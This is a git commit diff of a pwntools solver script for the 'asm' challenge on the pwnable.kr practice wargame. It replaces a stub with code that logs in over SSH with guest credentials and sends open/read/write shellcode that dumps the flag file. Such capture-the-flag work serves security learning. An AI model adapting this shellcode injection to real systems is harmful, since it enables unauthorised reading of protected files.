5c0b03ddac94ba138c27f5d90fdb5ecc8e48e727
SuperHenry2333 <931851825@qq.com>
2018-05-23 10:21:17 +0800

    clean

--- asm/solve.py
+++ asm/solve.py
@@ -1,13 +1,12 @@
 from pwn import *
-context(arch='i386',log_level='debug')
-# p=process("./orw",,env={"LD_PRELOAD":"./libc_32.so.6"})
-argv=['./']
-p=process(argv)
-def 
-
-
-# e=ELF('./libc-2.23.so')
-# sys_addr=libc_base+e.symbols['system']
-
-
-p.interactive()
+con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
+p = con.connect_remote('localhost', 9026)
+context(arch='amd64', os='linux')
+shellcode = ''
+shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
+shellcode += shellcraft.open('rsp', 0, 0)
+shellcode += shellcraft.read('rax', 'rsp', 100)
+shellcode += shellcraft.write(1, 'rsp', 100)
+p.recvuntil('shellcode: ')
+p.send(asm(shellcode))
+log.success(p.recvline())
